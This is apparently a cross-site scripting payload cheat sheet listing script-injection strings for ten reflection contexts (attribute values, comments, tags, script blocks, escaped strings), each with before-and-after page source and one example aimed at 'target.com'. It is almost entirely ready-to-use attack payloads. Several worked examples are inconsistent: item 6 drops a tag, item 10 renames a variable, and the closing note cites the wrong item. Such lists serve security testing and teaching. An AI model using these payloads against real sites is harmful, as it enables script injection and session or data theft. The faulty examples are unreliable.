# XSS Payloads 
1. Basic payload
```html
<script>alert(1)</script>
<svg/onload=alert(1)>
<img src=x onerror=alert(1)>
```

2. Add ' or " to escape the payload from value of an HTML tag
```html
"><script>alert(1)</script>
'><script>alert(1)</script> 
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value=""><script>alert(1)</script>
```

3. Add --> to escape the payload if input lands in HTML comments.
```html
--><script>alert(1)</script>
```

* Example source code
```html
<!-- REFLECTED_HERE --> 
```

* After input the payload
```html
<!-- --><script>alert(1)</script> -->
```

4. Add </tag> when the input inside or between opening/closing tags, tag can be <a>,<title,<script> and any other HTML tags
```html
</tag><script>alert(1)</script>
"></tag><script>alert(1)</script>
```

* Example source code
```html
<a class="item-pagination flex-c-m trans-0-4 active-pagination" href="https://target.com/1?status=REFLECTED_HERE">1</a>
```

* After input the payload
```html
<a class="item-pagination flex-c-m trans-0-4 active-pagination" href="https://target.com/1?status="></a><script>alert(1)</script>">1</a>
```

5. Use when input inside an attribute’s value of an HTML tag but > is filtered
```html
" onmouseover=alert(1)
" autofocus onfocus=alert(1)
```

* Example source code
```html
<input id="keyword" type="text" name="q" value="REFLECTED_HERE">
```

* After input the payload
```html
<input id="keyword" type="text" name="q" value="" onmouseover=alert(1)">
```

6. Use </script> when input inside <script> tags
```html
</script><script>alert(1)</script>
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = '</script>alert(1)</script>';
</script>
```

7. Use when input lands in a script block, inside a string delimited value.
```html
'-alert(1)-'
'/alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var sitekey = ''-alert(1)-'';
</script>
```

8. Same like Number 7. But inside a string delimited value but quotes are escaped by a backslash.
```html
\'alert(1)//
```

* Example source code
```html
<script>
    var sitekey = 'REFLECTED_HERE';
</script>
```

* If we input payload '-alert(1)-' it will be like this
```html
<script>
    var sitekey = '\'-alert(1)-\'';
</script>
```
The quotes are escaped by a backslash so we need to bypass them

* After input the payload
```html
<script>
    var sitekey = '\\'alert(1)//';
</script>
```

9. Use when there’s multi reflection in the same line of JS code
```html
/alert(1)//\
/alert(1)}//\
```

* Example source code
```html
<script>
    var a = 'REFLECTED_HERE'; var b = 'REFLECTED_HERE';
</script>
```

* After input the payload
```html
<script>
    var a = '/alert(1)//\'; var b = '/alert(1)//\';
</script>
```

10. Use when input inside a string delimited value and inside a single logical block like function or conditional (if, else, etc).
```html
'}alert(1);{'
\'}alert(1);{// 
```

* Example source code
```html
<script>
    var greeting;
    var time = 1;
    if (time < 10) {
    test = 'REFLECTED_HERE';
  }
</script>
```

* After input the payload
```html
<script>
    var test;
    var time = 1;
    if (time < 10) {
    test = ''}alert(1);{'';
  }
</script>
```

> Payload number 2 uses when quote escaped by backslash


*Will be updated again!
